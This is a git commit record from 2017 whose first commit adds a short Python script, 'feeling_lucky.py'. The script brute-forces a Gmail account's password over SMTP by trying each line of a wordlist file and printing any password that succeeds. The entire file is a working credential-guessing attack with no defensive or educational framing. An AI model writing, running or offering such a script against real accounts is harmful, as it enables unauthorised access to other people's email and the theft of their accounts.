2fdc3c9c0f5a7de67356ace423aca09ec6a456a5
unknown <lennykmutua@gmail.com>
2017-08-19 16:42:42 +0300

    First commit

---
+++ feeling_lucky.py
@@ -0,0 +1,18 @@
+import smtplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = "example@gmail.com"
+with open('words.txt', 'r') as f:
+	passwords = f.readlines()
+
+for password in passwords:
+	try:
+		smtpserver.login(user, password)
+		print("[+] Password Found: %s" % password)
+		break
+
+	except smtplib.SMTPAuthenticationError:
+		print("[!] Password incorrect: %s" % password)
